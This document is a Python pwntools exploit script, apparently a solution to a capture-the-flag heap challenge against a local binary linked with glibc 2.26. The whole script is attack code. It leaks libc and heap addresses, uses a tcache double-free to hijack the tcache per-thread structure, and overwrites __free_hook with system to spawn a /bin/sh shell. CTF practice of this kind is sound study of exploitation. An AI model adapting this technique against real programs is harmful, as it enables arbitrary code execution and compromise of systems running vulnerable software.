from pwn import *

elf = ELF("./pwn")
libc = ELF("/home/***/pwn/glibc-all-in-one/libs/2.26-0ubuntu2_amd64/libc-2.26.so")
context(arch=elf.arch, os=elf.os)
context.log_level = "debug"
p = process([elf.path])


def add_chunk(index, size):
    p.sendafter("choice:", "1")
    p.sendafter("index:", str(index))
    p.sendafter("size:", str(size))


def delete_chunk(index):
    p.sendafter("choice:", "2")
    p.sendafter("index:", str(index))


def edit_chunk(index, content):
    p.sendafter("choice:", "3")
    p.sendafter("index:", str(index))
    p.sendafter("length:", str(len(content)))
    p.sendafter("content:", content)


def show_chunk(index):
    p.sendafter("choice:", "4")
    p.sendafter("index:", str(index))


gdb.attach(p)
# pause()

# 泄露libc地址
add_chunk(0, 0x410)
add_chunk(1, 0x20)
delete_chunk(0)
add_chunk(0, 0x410)
show_chunk(0)

p.recvline()
# tmp = u64(p.recvuntil(b'\x7f').ljust(0x8, b'\x00'))
# print(f"tmp = {hex(tmp)}")
libc.address = u64(p.recvuntil(b"\x7f").ljust(0x8, b"\x00")) - 0x3DAC78
print(f"libc.address = {hex(libc.address)}")

# tcache double-free
add_chunk(2, 0x200)
add_chunk(3, 0x200)
delete_chunk(2)
delete_chunk(2)
show_chunk(2)

# leak heap address
tmp = u64(p.recvuntil((b"\x55", b"\x56"), drop=False)[1:].ljust(0x8, b"\x00"))
heap_addr = tmp - 0x6b0
print(f"heap_addr = {heap_addr:x}")

# tcache_chunk[2]->FD = heap_base + 0x10 = tcache_per_thread
edit_chunk(2, p64(heap_addr + 0x10))

# alloc, get tcache_per_thread
add_chunk(2, 0x200)
add_chunk(2, 0x200)

# hijack tcache_per_thread
edit_chunk(2, p8(7) * 64 + p64(libc.sym["__free_hook"]) * 64)
add_chunk(4, 0x20)
edit_chunk(4, p64(libc.sym["system"]))

# get shell
edit_chunk(3, b"/bin/sh\x00")
delete_chunk(3)

p.interactive()
